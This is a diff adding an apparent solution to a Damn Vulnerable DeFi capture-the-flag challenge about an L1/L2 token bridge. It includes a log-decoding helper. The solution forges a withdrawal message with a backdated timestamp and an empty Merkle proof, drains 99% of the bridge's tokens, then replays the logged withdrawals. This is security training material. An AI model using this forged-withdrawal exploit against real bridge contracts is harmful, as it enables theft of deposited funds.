@@ -9,6 +9,8 @@ import {L2MessageStore} from "../../src/withdrawal/L2MessageStore.sol";
 import {L2Handler} from "../../src/withdrawal/L2Handler.sol";
 import {TokenBridge} from "../../src/withdrawal/TokenBridge.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
+import {Bytes} from "@openzeppelin/contracts/utils/Bytes.sol";
+import {Merkle} from "murky/Merkle.sol";
 
 contract WithdrawalChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -84,12 +86,84 @@ contract WithdrawalChallenge is Test {
         assertEq(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT);
         assertEq(l1TokenBridge.totalDeposits(), INITIAL_BRIDGE_TOKEN_AMOUNT);
     }
+    struct Log{
+        bytes32[] topics;
+        bytes data;
+    }
+   struct MessageStored{
+        bytes32 id; uint256 nonce; address caller; address target; uint256 timestamp; bytes data;
+    }
+
+    function analyze() public {
+        console.logAddress(l2TokenBridge);
+        console.logUint(INITIAL_BRIDGE_TOKEN_AMOUNT - 999000000000000000000000);
+        Log[] memory logs = abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), "/test/withdrawal/withdrawals.json"))), (Log[]));
+        MessageStored[] memory messageStoreds = new MessageStored[](4);
+        for(uint256 i = 0; i < logs.length; i++){
+            console.logString("-------------------------");
+            Log memory log = logs[i];
+            (bytes32 id, uint256 timestamp, bytes memory data) = abi.decode(log.data, (bytes32, uint256 , bytes));
+
+            messageStoreds[i] = MessageStored(
+                id,
+                abi.decode(abi.encode(log.topics[1]), (uint256)),
+                abi.decode(abi.encode(log.topics[2]), (address)),
+                abi.decode(abi.encode(log.topics[3]), (address)),
+                timestamp,
+                data
+            );
+            console.logBytes32(id);
+            console.logUint(messageStoreds[i].nonce);
+            console.logAddress(messageStoreds[i].caller);
+            console.logAddress(messageStoreds[i].target);
+            console.logUint(timestamp);
+            console.logBytes(data);
+
+            (uint256 nonce, address l2Sender, address target, bytes memory message) = abi.decode(Bytes.slice(data, 4, data.length), (uint256, address, address, bytes));
+            console.logUint(nonce);
+            console.logAddress(l2Sender);
+            console.logAddress(target);
+            console.logBytes(message);
+            (address receiver, uint256 amount) = abi.decode(Bytes.slice(message, 4, message.length), (address, uint256));
+            console.logAddress(receiver);
+            console.logUint(amount);
+
+            bytes32 leaf = keccak256(abi.encode(nonce, messageStoreds[i].caller, messageStoreds[i].target, timestamp, data));
+            console.logBytes32(leaf);
+        }
+    }
 
     /**
      * CODE YOUR SOLUTION HERE
      */
     function test_withdrawal() public checkSolvedByPlayer {
-        
+
+        // now, we withdraw the balance immediately
+        bytes memory tokenBridgeMessage = abi.encodeCall(TokenBridge.executeTokenWithdrawal,(player, INITIAL_BRIDGE_TOKEN_AMOUNT * 99 / 100));
+        bytes memory l1ForwarderMessage = abi.encodeCall(L1Forwarder.forwardMessage, (0, player, address(l1TokenBridge), tokenBridgeMessage));
+        l1Gateway.finalizeWithdrawal(0, address(l2Handler), address(l1Forwarder), block.timestamp - 7 days, l1ForwarderMessage , new bytes32[](0));
+
+        // 7 days after, we execute the 4 tx, third will failed
+        Log[] memory logs = abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), "/test/withdrawal/withdrawals.json"))), (Log[]));
+        for(uint256 i = 0; i < logs.length; i++){
+            Log memory log = logs[i];
+            (bytes32 id, uint256 timestamp, bytes memory data) = abi.decode(log.data, (bytes32, uint256 , bytes));
+
+            MessageStored memory messageStored = MessageStored(
+                id,
+                abi.decode(abi.encode(log.topics[1]), (uint256)),
+                abi.decode(abi.encode(log.topics[2]), (address)),
+                abi.decode(abi.encode(log.topics[3]), (address)),
+                timestamp,
+                data
+            );
+            vm.warp(timestamp + 7 days);
+            l1Gateway.finalizeWithdrawal(messageStored.nonce, messageStored.caller, messageStored.target, messageStored.timestamp, messageStored.data , new bytes32[](0));
+
+        }
+
+        // transfer all token to l1TokenBridge
+        token.transfer(address(l1TokenBridge), token.balanceOf(player));
     }
 
     /**
